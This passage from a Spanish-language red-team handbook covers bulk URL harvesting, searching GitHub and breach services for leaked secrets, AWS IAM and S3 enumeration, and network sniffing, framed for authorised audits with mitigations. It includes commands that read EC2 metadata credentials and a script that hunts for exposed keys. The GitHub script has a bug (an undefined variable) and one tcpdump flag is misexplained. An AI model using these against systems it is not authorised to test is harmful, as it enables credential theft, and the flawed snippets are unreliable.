## Checklist rápido

* [ ] Validar alcance y RoE antes de fingerprinting.
* [ ] Ejecutar pipeline en entorno con snapshots.
* [ ] Recolectar salidas de varias herramientas.
* [ ] Ejecutar `aggregate_fingerprints.py` para normalizar resultados.
* [ ] Validar manualmente hallazgos críticos.
* [ ] Documentar fuentes, timestamps y operador en el reporte.

---

# Capítulo 12 — Escaneo web masivo y crawling

**Wayback, gau, gowitness. (Pipelines en Bash para recolectar URLs)**

**Objetivos**

* Comprender las fuentes históricas y dinámicas de URLs (Wayback, Common Crawl, Google cache, etc.) y su utilidad en recon web.
* Construir pipelines reproducibles para recolectar, filtrar y priorizar URLs a partir de `waybackurls`, `gau`, `gauplus`, `Amass`/`subfinder` y otros.
* Capturar evidencias visuales con `gowitness` (screenshots) y generar listados listos para fuzzing y pruebas posteriores.
* Presentar ejemplos robustos en **Bash** y fragmentos en **Python** para normalizar, extraer parámetros, y exportar CSV/JSON para ingestión en otros pasos del workflow.
* Incluir consideraciones éticas y de impacto: respetar scope, robots.txt, rate limits y acuerdos contractuales.

> **Aviso:** este capítulo muestra técnicas para recolectar gran cantidad de URLs. Úsalas únicamente dentro del alcance autorizado y en entornos controlados. Evita crawling agresivo contra infraestructuras productivas.

---

## Por qué recolectar URLs masivamente

* Recuperar endpoints antiguos o olvidados (paneles, backups, APIs) que aún responden.
* Encontrar parámetros potencialmente sensibles (id, token, debug) y puntos de inyección.
* Ampliar la superficie para fuzzing y análisis automático.
* Generar evidencia visual (screenshots) de recursos expuestos.

Fuentes típicas: Wayback Machine (archive.org), Common Crawl (via `gau` / `gauplus`), Google dorks, repositorios públicos, logs y certificados (crt.sh → hosts → URLs).

---

## Herramientas principales (resumen)

* `waybackurls` — recupera URLs históricas desde Archive.org y otros endpoints.
* `gau` / `gauplus` — obtiene URLs de Common Crawl, Wayback y otras fuentes consolidadas.
* `gf` / `gf-patterns` — para filtrar por patrones (xss, sqli, bloom, etc.).
* `gowitness` — captura screenshots headless (Chromium) y genera reportes.
* `httpx` / `httprobe` / `cero` — validación de URLs que resuelven y respuesta HTTP.
* `ffuf` / `gobuster` — fuzzing programable (paso posterior).
* `jq`, `ripgrep`, `sed`, `awk` — herramientas unix para procesado.

Instalación rápida (si falta):

```bash
sudo apt update
sudo apt install -y jq ripgrep chromium-browser
# go tools; se asume GOPATH/Go ya configurados
GO111MODULE=on go install github.com/tomnomnom/waybackurls@latest
GO111MODULE=on go install github.com/lc/gau/v2/cmd/gau@latest
GO111MODULE=on go install github.com/OJ/gobuster/v3@latest
# gowitness puede instalarse desde release o via apt en algunas distros
```

Ajusta según tu entorno/lab.

---

## Flujo recomendado (pipeline high-level)

1. **Input:** lista de dominios/subdominios verificados (p. ej. `targets.txt`).
2. **Recolección:** ejecutar `gau` y `waybackurls` por cada host para obtener URLs históricas y actuales.
3. **Normalización:** deduplicar, normalizar esquemas (http/https), eliminar assets estáticos (css,jpg,svg) salvo que sean relevantes.
4. **Validación:** comprobar con `httpx` o `wget --spider` cuáles URLs responden.
5. **Filtrado:** aplicar `gf` patterns y heurísticas para priorizar endpoints potencialmente interesantes (login, admin, api, debug).
6. **Evidencia visual:** capturar pantallas de endpoints clave con `gowitness`.
7. **Exportación:** generar CSV/JSON con metadatos: `url,domain,status_code,content_type,content_length,ts,source`.
8. **Ingesta:** alimentar los resultados al gestor de campaña/KPI.

---

## Pipeline Bash completo (ejecutable)

Guarda como `collect_urls_pipeline.sh`. Requiere: `gau`, `waybackurls`, `httpx`, `jq`, `gowitness`, `parallel` (opcionales).

```bash
#!/usr/bin/env bash
set -euo pipefail
# collect_urls_pipeline.sh
# Uso: ./collect_urls_pipeline.sh targets.txt outdir
TARGETS=${1:-targets.txt}
OUTDIR=${2:-./urls_out}
TS=$(date +%Y%m%d_%H%M%S)
mkdir -p "$OUTDIR/raw" "$OUTDIR/validated" "$OUTDIR/screens" "$OUTDIR/reports"

echo "[*] Leyendo targets desde $TARGETS"
while IFS= read -r domain; do
  echo "[*] Procesando $domain"
  # Recolección pasiva/activa
  echo "$domain" | gau --o "$OUTDIR/raw/${domain}_gau_${TS}.txt" 2>/dev/null || true
  echo "$domain" | waybackurls > "$OUTDIR/raw/${domain}_wayback_${TS}.txt" || true

  # Concatenar y normalizar: quitar fragmentos, dedup
  cat "$OUTDIR/raw/${domain}_gau_${TS}.txt" "$OUTDIR/raw/${domain}_wayback_${TS}.txt" \
    | sed 's/#.*$//' \
    | sed 's/\/$//' \
    | grep -E '^https?://' \
    | sort -u > "$OUTDIR/raw/${domain}_candidates_${TS}.txt"

  # Filtrado básico: quitar assets estáticos (modifica según necesidad)
  rg -v '\.(jpg|jpeg|png|gif|css|svg|woff|ttf|ico|map)$' "$OUTDIR/raw/${domain}_candidates_${TS}.txt" \
    > "$OUTDIR/raw/${domain}_filtered_${TS}.txt" || true

  # Validación con httpx (paralelo y rápido) -> JSONL
  if command -v httpx >/dev/null 2>&1; then
    cat "$OUTDIR/raw/${domain}_filtered_${TS}.txt" | httpx -silent -json -o "$OUTDIR/validated/${domain}_httpx_${TS}.jsonl" || true
  else
    # fallback: wget --spider (lento)
    while IFS= read -r url; do
      status=$(curl -I -s -o /dev/null -w "%{http_code}" "$url" || echo "000")
      echo "{\"url\":\"$url\",\"code\":\"$status\"}" >> "$OUTDIR/validated/${domain}_httpx_${TS}.jsonl"
    done < "$OUTDIR/raw/${domain}_filtered_${TS}.txt"
  fi

  # Extraer URLs 200+ y preparar para screenshots
  jq -r 'select(.status!=null) | select(.status | tostring | startswith("2")) | .url' "$OUTDIR/validated/${domain}_httpx_${TS}.jsonl" \
    > "$OUTDIR/validated/${domain}_live_${TS}.txt" || true

  # Priorizar entrypoints: admin/login/api
  rg -i 'admin|login|signin|dashboard|wp-admin|api|oauth|token' "$OUTDIR/validated/${domain}_live_${TS}.txt" \
    | sort -u > "$OUTDIR/validated/${domain}_priority_${TS}.txt" || true

  # Screenshots con gowitness (puede exigir Chromium)
  if command -v gowitness >/dev/null 2>&1; then
    cat "$OUTDIR/validated/${domain}_priority_${TS}.txt" | parallel -j5 gowitness file -u {} -P "$OUTDIR/screens" 2>/dev/null || true
  fi

  # Exportar CSV summary
  python3 - <<PY
import json, csv,sys
jfile = "$OUTDIR/validated/${domain}_httpx_${TS}.jsonl"
outcsv = "$OUTDIR/reports/${domain}_summary_${TS}.csv"
rows=[]
try:
    with open(jfile) as fh:
        for l in fh:
            try:
                obj=json.loads(l)
                rows.append({
                    "url": obj.get("url"),
                    "status": obj.get("status") or obj.get("code") or "",
                    "title": obj.get("title",""),
                    "content_type": obj.get("content-type",""),
                    "length": obj.get("content-length",""),
                })
            except:
                pass
except FileNotFoundError:
    pass
with open(outcsv,"w",newline="",encoding="utf-8") as f:
    w=csv.DictWriter(f, fieldnames=["url","status","title","content_type","length"])
    w.writeheader()
    for r in rows:
        w.writerow(r)
print("CSV generado:", outcsv)
PY

done < "$TARGETS"

echo "[*] Pipeline completado. Revisar $OUTDIR"
```

**Notas del pipeline**

* Ajusta concurrencia (`parallel -j`) según recursos y RoE.
* `httpx` ofrece múltiples campos (`status`, `title`, `content-type`, `content-length`) útiles para priorizar.
* Filtrado adicional con `gf` para patrones de interés (`gf xss`, `gf sqli`, etc.) puede añadirse antes del paso de screenshots.

---

## Python: extracción de parámetros y priorización (snippet)

`extract_params.py` — parsea URLs y extrae parámetros para identificar posibles vectores (id, token, debug, session).

```python
#!/usr/bin/env python3
import urllib.parse, csv, sys, os
if len(sys.argv) < 2:
    print("Usage: extract_params.py urls.txt")
    sys.exit(1)
infile=sys.argv[1]
out='params_extracted.csv'
seen=set()
with open(infile) as fh, open(out,'w',newline='',encoding='utf-8') as outfh:
    w=csv.writer(outfh)
    w.writerow(['url','param','value'])
    for u in fh:
        u=u.strip()
        if not u: continue
        q = urllib.parse.urlparse(u).query
        if not q: continue
        params = urllib.parse.parse_qs(q, keep_blank_values=True)
        for k,v in params.items():
            for val in v:
                row=(u,k,val)
                if row not in seen:
                    seen.add(row)
                    w.writerow(row)
print("Exportado:", out)
```

---

## Consideraciones de impacto y rate-limits

* Respeta `robots.txt` si el RoE lo solicita; igualmente el hecho de que un recurso exista públicamente no autoriza crawling agresivo.
* Implementar backoff y límites: `sleep`, `--max-connections` o `-rate` en herramientas que lo permitan.
* Evita solicitudes simultáneas a un mismo host desde muchas sesiones para no causar DoS accidental.
* Mantén logs y evidencia: si un servicio falla tras tu crawling, tendrás registros que justifiquen la causa y permitirán rollback.

---

## Evidencia y trazabilidad

Guarda archivos raw (`wayback`, `gau`) junto con `httpx` JSONL y `gowitness` outputs. Añade metadatos por campaña: `campaign_id`, `operator`, `timestamp`. Nunca subas datos sensibles a repos públicos.

---

## Recomendaciones de mitigación (desde la perspectiva defensiva)

* Monitorizar crawling intensivo: tasa de requests por IP, patrones de fuzzing (URL con parámetros inusuales).
* Implementar WAF y reglas para endpoints de administración (bloqueo por geolocalización, MFA).
* Revisar Wayback y Common Crawl exposure: si recursos sensibles aparecen, tomar medidas de remoción o control de accesos.
* Rate-limit y CAPTCHA en endpoints críticos, y alertas para cambios inusuales en volumen de requests.

---

## Checklist rápido

* [ ] Targets verificados dentro del scope.
* [ ] Backups/snapshots y plan de comunicación.
* [ ] Recolección desde `gau` y `waybackurls` realizada.
* [ ] Normalización y filtrado (assets, duplicates) aplicados.
* [ ] Validación con `httpx` o método alternativo.
* [ ] Prioridad y screenshots con `gowitness` para endpoints críticos.
* [ ] Exportación CSV/JSON para ingestión en pipeline siguiente.
* [ ] Logs guardados en repositorio seguro y metadatos añadidos.

---

# Capítulo 13 — Recolección y análisis de credenciales públicas

**Breach records, GitHub secrets, bucket exposures. (Scrapers en Python)**

**Objetivos**

* Entender las fuentes donde pueden aparecer credenciales y secretos expuestos públicamente: bases de datos de filtraciones, repositorios públicos, y buckets/objetos en la nube.
* Aprender una metodología defensiva para localizar, catalogar y notificar hallazgos dentro de un scope autorizado.
* Automatizar búsquedas legítimas y responsables usando APIs oficiales y herramientas seguras; normalizar y exportar evidencia para remediación.
* Incluir plantillas en Bash y Python que implementan backoff, logging y límites para evitar abuso de servicios y cumplir ToS.

> **Aviso legal y ético (obligatorio):** los ejemplos de este capítulo **solo** deben usarse en activos que controles o para los que tengas autorización **escrita y documentada**. Buscar, descargar o explotar credenciales ajenas sin permiso es delito en muchas jurisdicciones. Antes de ejecutar cualquier script, confirma el alcance con el cliente y la política interna. Realiza copias de seguridad y guarda evidencia en repositorio seguro.

---

## Fuentes habituales de exposición de credenciales

* **Breach databases / paste sites:** dumps de contraseñas y leaks; p. ej. bases públicas o foros. Uso responsable: preferir servicios centralizados y legales (Have I Been Pwned, DeHashed con acuerdos).
* **Repositorios públicos (GitHub, GitLab):** commits con `.env`, `config.php`, claves hardcoded, tokens de CI/CD.
* **Buckets y almacenamiento en la nube (S3, GCS, Azure Blobs):** objetos públicos o listables por error de configuración.
* **Backups y archivos históricos en Wayback / Common Crawl.**
* **Páginas de configuración expuestas, scripts de despliegue, plantillas.**

---

## Metodología defensiva general

1. **Definir scope y objetivos:** dominios, organizaciones, cuentas, repositorios, rangos de IP.
2. **Recolectar desde APIs oficiales cuando existan:** GitHub Search API, HIBP API, proveedores de nube (si tienes permiso).
3. **Normalizar y clasificar hallazgos:** tipo (token, password, key), gravedad (expuesto público/solo-auth), recurso afectado, evidencia (URL, commit hash, timestamp).
4. **Verificación manual controlada:** validar que la credencial existe y si está activa SÓLO con permisos/consentimiento. No comprobar credenciales por autenticación en sistemas de terceros sin autorización.
5. **Notificación y remediación:** emitir ticket interno o contactar responsable con plantilla responsable disclosure.
6. **Remediación y seguimiento:** rotación de secretos, invalidación de tokens, limpieza de repositorios y pipelines.
7. **Documentación:** guardar logs, captures y justificar acciones.

---

## Herramientas y limitaciones legales/técnicas

* **GitHub Search API:** permite buscar en código público; requiere token y respeta rate-limits.
* **Have I Been Pwned (HIBP) API:** para emails/passwords (p. ej. Pwned Passwords) con límites y requisitos.
* **Boto3 / google-cloud-storage / azure-storage-blob:** para interactuar con storage; comprobar accesibilidad pública sin autenticación es posible mediante HEAD/GET a URLs públicas.
* **Requests + parsing + regex:** para análisis ligero de contenido descargado.
* **Evitar scraping agresivo:** usar backoff, sleeps y respetar condiciones de uso.

---

## Ejemplo 1 — Búsqueda responsable en GitHub (Python, usa Search API)

Este script busca patrones típicos en código público (ej.: `AWS_SECRET_ACCESS_KEY`, `password =`) y guarda resultados. **No** pruebes credenciales descubiertas. Usa un token personal con mínimo scope y respeta rate limits.

```python
#!/usr/bin/env python3
# github_secret_finder.py — búsqueda responsable en GitHub (ejemplo)
import os, requests, time, csv, logging, sys

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
if not GITHUB_TOKEN:
    print("Set GITHUB_TOKEN in env")
    sys.exit(1)

HEADERS = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3.text-match+json"}
SEARCH_QUERIES = [
    'AWS_SECRET_ACCESS_KEY',
    'AWS_ACCESS_KEY_ID',
    'PRIVATE_KEY',
    'password =',
    'TOKEN='
]
OUTFILE = "github_secrets_results.csv"

logging.basicConfig(filename='github_search.log', level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
session = requests.Session()
session.headers.update(HEADERS)

def search_code(q, page=1):
    params = {"q": q + " in:file", "per_page": 30, "page": page}
    r = session.get("https://api.github.com/search/code", params=params, timeout=15)
    r.raise_for_status()
    return r.json()

def main():
    rows=[]
    for q in SEARCH_QUERIES:
        logging.info("Searching GitHub for query: %s", q)
        page=1
        while True:
            data = search_code(q, page=page)
            items = data.get("items", [])
            for it in items:
                rows.append({
                    "query": q,
                    "path": it.get("path"),
                    "repo": it.get("repository",{}).get("full_name"),
                    "url": it.get("html_url")
                })
            if 'next' in r.links or len(items)==30:
                page += 1
                time.sleep(2)  # backoff simple
            else:
                break
    # export CSV
    with open(OUTFILE,'w',newline='',encoding='utf-8') as fh:
        w=csv.DictWriter(fh, fieldnames=["query","repo","path","url"])
        w.writeheader()
        for row in rows:
            w.writerow(row)
    logging.info("Done. Results in %s", OUTFILE)

if __name__ == "__main__":
    main()
```

**Notas importantes:**

* Limita queries y páginas para no agotar rate limits.
* Filtra por organización (`org:your-org`) cuando busques repos de tu empresa.
* Para eliminación de secretos en GitHub, sigue procesos oficiales: invalidar token, borrar commit, usar `git filter-repo` o contactar GitHub Support.

---

## Ejemplo 2 — Comprobación de buckets públicos (S3/GCS/Azure) — método no autenticado

La comprobación de accesibilidad pública puede realizarse con peticiones HTTP simples hacia la URL pública del bucket. No intentes listar / descargar datos a gran escala sin permiso; este script solo prueba si el bucket permite listado público (HEAD/GET limitado).

```python
#!/usr/bin/env python3
# check_bucket_public.py — pruebas no autenticadas (solo HEAD/GET controlado)
import requests, sys, csv, time, logging
logging.basicConfig(level=logging.INFO, filename='buckets.log', format='%(asctime)s %(message)s')
OUT='buckets_results.csv'
buckets = ['my-bucket.example.com', 'public-bucket.s3.amazonaws.com']  # ejemplo o cargar desde archivo

rows=[]
for b in buckets:
    url = f"https://{b}/"
    try:
        r = requests.head(url, timeout=10, allow_redirects=True)
        status = r.status_code
        logging.info("%s -> %s", url, status)
        rows.append({"bucket":b,"url":url,"status":status})
        time.sleep(1)
    except Exception as e:
        logging.error("Error %s: %s", url, e)
        rows.append({"bucket":b,"url":url,"status":"error"})
with open(OUT,'w',newline='',encoding='utf-8') as fh:
    import csv
    w=csv.DictWriter(fh,fieldnames=["bucket","url","status"])
    w.writeheader()
    for r in rows:
        w.writerow(r)
print("Results in", OUT)
```

**Precaución:** si `GET` devuelve 200 y listado con objetos, documenta y notifica al responsable; **no** descargues ni manipules datos sin autorización.

---

## Ejemplo 3 — Comprobación de correos en Breach DBs (Have I Been Pwned, Pwned Passwords)

HIBP posee APIs para organizaciones y pwned passwords (hash range). El siguiente ejemplo muestra cómo consultar Pwned Passwords por rango (k-Anonymity), método que no envía contraseñas completas y respeta privacidad.

```python
#!/usr/bin/env python3
# pwned_check.py — verificación de contraseña por k-anonymity (SHA1 prefix)
import hashlib, requests, sys

def pwned_count(password):
    sha1 = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    url = f"https://api.pwnedpasswords.com/range/{prefix}"
    res = requests.get(url, timeout=10)
    if res.status_code != 200:
        raise Exception("API error")
    for line in res.text.splitlines():
        h,s = line.split(':')
        if h == suffix:
            return int(s)
    return 0

if __name__ == "__main__":
    pwd = sys.argv[1]
    cnt = pwned_count(pwd)
    print(f"Password found {cnt} times" if cnt else "Password not found")
```

**Advertencia:** no utilices este script para verificar contraseñas de terceros sin consentimiento. Para emails, HIBP ofrece endpoints comerciales que requieren acuerdo.

---

## Clasificación y priorización de hallazgos

* **Tipo A (crítico):** credenciales con acceso a producción (tokens con scope write, keys activas). Requiere acción inmediata: rotación y bloqueo.
* **Tipo B (alto):** claves de acceso a servicios de desarrollo o staging; rotar y revisar logs.
* **Tipo C (media):** contraseñas hardcoded en scripts locales; invalidar y remover.
* **Tipo D (baja):** información derivada (usernames, correos sin credenciales).

Incluye en tu reporte: `resource`, `evidence_url`, `first_seen`, `severity`, `recommendation`, `owner_contact`.

---

## Notificación y remediación (plantilla breve)

```
Asunto: Divulgación responsable — Credencial expuesta en repo público

Hola [Equipo de Seguridad / Soporte],

He detectado una credencial expuesta en [url] perteneciente al proyecto [repo]. Resumen:
- Recurso: [repo/path@commit]
- Evidencia: [URL, captura, hash]
- Tipo: [API token / AWS key / password]
- Recomendación inmediata: invalidar token, rotar credenciales, borrar commit con git filter-repo, revisar pipelines.

Puedo colaborar en la mitigación si lo desean.

Saludos,
[Nombre / Contacto]
```

---

## Recomendaciones de mitigación preventiva

* Usar secret scanning en repositorios (GitHub Advanced Security, truffleHog en pipelines).
* Implementar vaults (HashiCorp Vault, AWS Secrets Manager) y evitar secrets en código.
* Forzar rotación periódica de claves y uso de roles con mínimo privilegio.
* Habilitar alertas de uso anómalo (logs, CloudTrail, SIEM).
* Educar equipos sobre no subir `.env` ni commits con secretos; añadir reglas en pre-commit hooks.

---

## Checklist operativo

* [ ] Scope y autorizaciones documentadas.
* [ ] Tokens de API para búsquedas limitados a lo necesario y guardados con permisos 600.
* [ ] Backoff y límites en todos los scripts.
* [ ] Evidencia almacenada en repositorio seguro (no en repos públicos).
* [ ] Procedimiento de notificación y remediación probado.
* [ ] Rotación de claves y mitigaciones aplicadas y verificadas.

---

# Capítulo 14 — Mapeo de infraestructura cloud

**Enumeración de buckets, IAM y metadatos. (Ejemplos con AWS CLI y boto3)**

**Objetivos**

* Comprender cómo identificar, analizar y documentar la infraestructura en la nube (especialmente AWS) dentro de entornos autorizados.
* Enumerar y validar configuraciones de almacenamiento (S3 buckets), políticas de identidad (IAM) y metadatos de instancias.
* Implementar scripts prácticos en Bash y Python (boto3) para auditoría y detección de exposiciones.
* Promover prácticas seguras de reconocimiento cloud dentro de campañas de Red Team y evaluaciones de seguridad.

> **Aviso ético:** este capítulo está orientado exclusivamente a auditorías con autorización o entornos propios/laboratorios. La enumeración no autorizada de servicios cloud de terceros puede violar leyes y términos de servicio. Todos los ejemplos deben ejecutarse **únicamente** en cuentas bajo control del operador o cliente con consentimiento por escrito.

---

## Introducción y contexto

Las arquitecturas cloud son complejas: involucran almacenamiento, cómputo, redes, IAM, lambdas, y APIs públicas. Para un red teamer, comprender cómo mapear la superficie expuesta y las configuraciones erróneas permite simular ataques realistas y detectar riesgos antes que los adversarios reales.

Principales objetivos del mapeo:

* **Identificar recursos públicos:** buckets, endpoints API Gateway, instancias con IP pública.
* **Enumerar políticas IAM y privilegios excesivos.**
* **Revisar metadatos y roles adjuntos a instancias.**
* **Comprobar configuraciones de red (Security Groups, ACLs).**
* **Detectar almacenamiento y secretos expuestos.**

---

## Herramientas principales

* **AWS CLI** — interfaz oficial para interactuar con recursos AWS.
* **boto3** — SDK de AWS para Python, ideal para scripting y análisis.
* **ScoutSuite, Prowler, CloudMapper** — frameworks para auditorías completas.
* **curl / wget** — para consultar endpoints de metadatos (`169.254.169.254`).
* **jq** — formatear respuestas JSON.

---

## Requisitos previos

* Credenciales válidas (Access Key / Secret Key) **de la cuenta bajo evaluación**.
* Permisos mínimos de solo lectura (`SecurityAudit`, `ReadOnlyAccess`).
* Configuración previa de perfil AWS:

  ```bash
  aws configure --profile audit
  ```

---

## Enumeración con AWS CLI (manual y automatizada)

Todos los comandos siguientes se asumen dentro del perfil `audit`.

### 1. Listado y verificación de buckets S3

```bash
aws s3 ls --profile audit
```

Verificar políticas y ACLs:

```bash
aws s3api get-bucket-acl --bucket my-bucket --profile audit
aws s3api get-bucket-policy --bucket my-bucket --profile audit
```

Comprobar acceso público:

```bash
aws s3api get-bucket-policy-status --bucket my-bucket --profile audit
aws s3api get-public-access-block --bucket my-bucket --profile audit
```

### 2. Enumeración de usuarios y roles IAM

```bash
aws iam list-users --profile audit
aws iam list-roles --profile audit
aws iam list-policies --scope Local --profile audit
```

Revisar permisos de usuario:

```bash
aws iam list-attached-user-policies --user-name <nombre> --profile audit
aws iam get-user --user-name <nombre> --profile audit
```

### 3. Enumeración de instancias EC2 y metadatos

```bash
aws ec2 describe-instances --query 'Reservations[*].Instances[*].{ID:InstanceId,State:State.Name,Public:PublicIpAddress,Role:IamInstanceProfile.Arn}' --output table --profile audit
```

Obtener metadatos desde una instancia (en laboratorio):

```bash
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/info
```

### 4. Revisión de políticas abiertas (wildcards)

```bash
aws iam list-policies --scope Local --query 'Policies[*].PolicyName' --output text --profile audit | while read p; do
  aws iam get-policy-version --policy-arn "arn:aws:iam::123456789012:policy/$p" --version-id v1 --profile audit | jq '.PolicyVersion.Document.Statement[] | select(.Action=="*" or .Resource=="*")'
done
```

Esto permite detectar permisos tipo `*:*` (alto riesgo).

---

## Automatización en Bash — Auditoría básica

`cloud_enum.sh`

```bash
#!/usr/bin/env bash
PROFILE=${1:-audit}
OUT=cloud_audit_$(date +%Y%m%d_%H%M%S).txt

{
echo "=== Buckets ==="
aws s3 ls --profile $PROFILE

echo "=== IAM Users ==="
aws iam list-users --profile $PROFILE | jq -r '.Users[].UserName'

echo "=== Roles ==="
aws iam list-roles --profile $PROFILE | jq -r '.Roles[].RoleName'

echo "=== EC2 Instances ==="
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output text --profile $PROFILE

echo "=== CloudFront Distributions ==="
aws cloudfront list-distributions --profile $PROFILE | jq -r '.DistributionList.Items[].DomainName'
} > "$OUT"

echo "Report generated: $OUT"
```

Este script genera una visión general rápida de la infraestructura bajo el perfil especificado.

---

## Automatización con boto3 — Mapeo y exportación a JSON

`aws_mapper.py`

```python
#!/usr/bin/env python3
import boto3, json, datetime

session = boto3.Session(profile_name="audit")
s3 = session.client('s3')
iam = session.client('iam')
ec2 = session.client('ec2')
output = {'timestamp': datetime.datetime.utcnow().isoformat(), 'buckets':[], 'users':[], 'roles':[], 'instances':[]}

# S3 Buckets
for b in s3.list_buckets()['Buckets']:
    name = b['Name']
    bucket_info = {'name': name}
    try:
        acl = s3.get_bucket_acl(Bucket=name)
        bucket_info['grants'] = [g['Grantee'].get('URI','') for g in acl['Grants'] if 'URI' in g['Grantee']]
    except Exception as e:
        bucket_info['error'] = str(e)
    output['buckets'].append(bucket_info)

# IAM Users and Roles
for user in iam.list_users()['Users']:
    u = {'name': user['UserName'], 'create_date': str(user['CreateDate'])}
    output['users'].append(u)

for role in iam.list_roles()['Roles']:
    r = {'name': role['RoleName'], 'trust': role.get('AssumeRolePolicyDocument',{})}
    output['roles'].append(r)

# EC2 Instances
for r in ec2.describe_instances()['Reservations']:
    for inst in r['Instances']:
        i = {
            'id': inst['InstanceId'],
            'state': inst['State']['Name'],
            'ip': inst.get('PublicIpAddress'),
            'iam_role': inst.get('IamInstanceProfile',{}).get('Arn')
        }
        output['instances'].append(i)

with open('aws_inventory.json','w',encoding='utf-8') as f:
    json.dump(output,f,indent=2)
print("Inventario guardado en aws_inventory.json")
```

**Qué realiza:**

* Lista buckets y sus ACLs, usuarios y roles IAM, e instancias EC2 con IP pública.
* Exporta la información en un JSON estructurado, útil para auditorías o integración con dashboards.

---

## Validación de metadatos (laboratorio)

Los metadatos EC2 revelan información sensible si se configuran mal. Ejemplo de lectura completa:

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Buenas prácticas:**

* Bloquear acceso al endpoint desde contenedores/pods sin necesidad.
* En AWS, usar IMDSv2 (`aws ec2 modify-instance-metadata-options --http-tokens required`).
* Auditar roles y credenciales expuestas.

---

## Recomendaciones de mitigación

* Habilitar bloqueos públicos (`Block Public Access`) en todos los buckets S3.
* Aplicar el principio de mínimo privilegio en IAM: evitar wildcards.
* Usar roles temporales en lugar de claves estáticas.
* Activar logs de CloudTrail, Config y GuardDuty para detección continua.
* Revisar endpoints de metadatos y exigir IMDSv2.
* Monitorear creación/eliminación de recursos mediante CloudWatch Events.

---

## Checklist de mapeo cloud

* [ ] Perfil AWS configurado con permisos de solo lectura.
* [ ] Buckets listados y revisados con políticas públicas detectadas.
* [ ] IAM roles y políticas exportadas y revisadas por exceso de privilegios.
* [ ] EC2 y recursos expuestos documentados.
* [ ] Endpoint de metadatos validado y protegido (IMDSv2).
* [ ] Evidencia y JSON guardados en repositorio seguro.
* [ ] Reporte de hallazgos y recomendaciones entregado al cliente.

---

## Parte III — Enumeración activa y explotación inicial

# Capítulo 15 — Ataques de red básicos: ARP, ICMP y sniffing

**Herramientas:** `tcpdump`, `tshark`, `mitmproxy`, `scapy`, `pyshark`.
**Objetivos**

* Comprender las bases del tráfico de red implicado en ARP, ICMP y protocolos transportados (TCP/UDP).
* Saber capturar y filtrar tráfico de forma eficaz con `tcpdump`/`tshark` y procesar PCAPs con Python.
* Detectar anomalías (duplicidad de IP, floods ICMP) y realizar monitoreo pasivo para detección.
* Configurar un proxy de inspección controlada (`mitmproxy`) **en laboratorio** y registrar evidencias.
* Incluir scripts seguros y defensivos para captura, rotación de logs y análisis automatizado.

> **Aviso legal y ético (obligatorio).**
> Todo el contenido de este capítulo está orientado a pruebas en entornos controlados o con autorización explícita. El sniffing de redes, manipulación de tráfico o interceptación TLS de sistemas ajenos sin permiso es ilegal en muchas jurisdicciones. No uses estas técnicas contra terceros sin autorización escrita.

---

## Conceptos rápidos

* **ARP (Address Resolution Protocol):** resuelve direcciones IPv4 a direcciones MAC dentro de una LAN. Actividades anómalas: ARP spoofing (actividad activa que permite MITM).
* **ICMP (Internet Control Message Protocol):** usado para diagnósticos (ping) y mensajes de error; patrones anormales incluyen ICMP floods o respuestas inesperadas.
* **Sniffing pasivo:** capturar paquetes en la interfaz para análisis (no altera el tráfico).
* **Interceptación TLS con proxy:** `mitmproxy` actúa como proxy TLS si el cliente confía en su CA — sólo válido en laboratorio o con consentimiento.

---

## Captura básica con tcpdump

Guardar todo el tráfico de interfaz en pcap rotando por tamaño:

```bash
sudo tcpdump -i eth0 -w /var/log/redteam/capture_%Y%m%d_%H%M%S.pcap -C 100 -W 10 -Z root
```

Explicación:

* `-i eth0` interfaz.
* `-w` archivo salida; usar rutas con timestamp (ver `strftime` wrapper).
* `-C 100` rota archivo cuando alcance 100 MB.
* `-W 10` mantener 10 archivos rotados.
* `-Z root` reducir privilegios del proceso tras abrir el socket (si se desea).

Filtros útiles (BPF) — ejemplos:

```bash
# Solo tráfico ARP
sudo tcpdump -i eth0 arp -w arp_cap.pcap

# ICMP echo (ping) y replies
sudo tcpdump -i eth0 icmp and \(icmp[0]==8 or icmp[0]==0\) -w icmp_ping.pcap

# Solo tráfico hacia/desde IP y puertos HTTP(S)
sudo tcpdump -i eth0 host 10.0.0.5 and \(port 80 or port 443\) -w target_http.pcap

# TCP SYNs (posible scan)
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -w syns.pcap
```

Para ver en tiempo real con texto legible:

```bash
sudo tcpdump -i eth0 -n -vvv -A 'tcp port 80 and host 10.0.0.5'
```

`-A` muestra payload ASCII (solo para diagnóstico en laboratorio).

---

## Extracción y análisis con tshark

`tshark` es el equivalente en línea de comandos de Wireshark y permite exportar CSV/JSON directamente.

Ejemplo: extraer flujos HTTP con SNI y host:

```bash
tshark -r capture.pcap -Y 'http.request' -T fields -e frame.time_epoch -e ip.src -e ip.dst -e http.host -e http.user_agent > http_requests.tsv
```

Extraer métricas ICMP:

```bash
tshark -r capture.pcap -Y icmp -T fields -e frame.time -e ip.src -e ip.dst -e icmp.type > icmp_events.tsv
```

Convertir pcap a JSONL (para ingestión):

```bash
tshark -r capture.pcap -T ek > capture.jsonl
```

(`-T ek` genera evento estilo Elastic Common Schema).

---

## Monitoreo ARP pasivo con Scapy (detección de duplicidad / cambios)

Evitar dar instrucciones de ARP spoofing; en su lugar un script defensivo que monitorea el cache ARP y detecta múltiples MACs por IP.

`arp_watch.py` (sólo lectura, requiere permisos):

```python
#!/usr/bin/env python3
from scapy.all import sniff, ARP
from collections import defaultdict
import time, json, os

seen = defaultdict(set)
LOG="logs/arp_watch.log"
os.makedirs('logs', exist_ok=True)

def handle(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2):  # who-has or is-at
        ip = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc
        seen[ip].add(mac)
        if len(seen[ip]) > 1:
            entry = {"ts": int(time.time()), "ip": ip, "macs": list(seen[ip])}
            with open(LOG,"a") as fh:
                fh.write(json.dumps(entry)+"\n")
            print("ARP anomaly:", entry)

if __name__ == "__main__":
    print("Starting passive ARP watch...")
    sniff(filter="arp", prn=handle, store=False)
```

